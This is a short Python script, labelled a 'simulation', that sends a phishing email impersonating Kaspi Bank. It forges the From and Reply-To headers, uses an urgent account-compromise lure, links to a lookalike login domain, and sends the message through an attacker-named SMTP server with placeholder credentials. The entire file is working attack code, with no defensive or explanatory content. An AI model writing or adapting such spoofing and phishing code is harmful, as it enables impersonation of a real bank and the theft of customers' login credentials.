import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


def simulate_spoofing_attack():

    sender = "attacker@example.com"
    receiver = "victim@example.com"


    subject = "Urgent: Your Account Has Been Compromised"
    fake_sender = "kaspi@bank.com"  # Spoofed sender address
    fake_reply_to = "fake-kaspi@bank.com"  # Fake reply-to header


    body = """
    Dear Customer,

    We have detected suspicious activity on your account. Please click the link below to secure your account:

    http://kaspi-bank-login.com

    Failure to do so may result in your account being locked.

    Regards,
    Kaspi Bank Support Team
    """


    msg = MIMEMultipart()
    msg['From'] = fake_sender
    msg['To'] = receiver
    msg['Subject'] = subject
    msg['Reply-To'] = fake_reply_to


    msg.attach(MIMEText(body, 'plain'))


    smtp_server = "smtp.hacker.com"
    smtp_port = 587
    smtp_username = "root"
    smtp_password = "12345678"


    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(smtp_username, smtp_password)
        server.sendmail(sender, receiver, msg.as_string())
        server.quit()
        print("Spoofed email sent successfully (simulation).")
    except Exception as e:
        print(f"Error: {e}")


if __name__ == "__main__":
    simulate_spoofing_attack()
